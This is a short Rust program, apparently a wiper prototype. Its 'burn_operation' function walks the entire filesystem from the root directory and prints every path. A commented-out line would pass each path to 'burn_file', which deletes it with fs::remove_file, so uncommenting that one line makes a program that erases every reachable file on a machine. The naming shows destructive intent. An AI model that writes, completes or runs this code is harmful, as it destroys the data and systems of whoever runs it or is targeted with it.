use std::fs;
extern crate glob;
use jwalk::WalkDir;




fn main() -> std::io::Result<()> {
    burn_operation()?;
    Ok(())
}

    
fn burn_operation() -> std::io::Result<()> {

    for file_path in WalkDir::new("/") {
        println!("{}", file_path.unwrap().path().display());
        // burn_file(file_path.unwrap().path().display().to_string().as_str())?;
      }
   Ok(())
}


fn burn_file(path: &str) -> std::io::Result<()> {
    fs::remove_file(path)?;
    Ok(())
}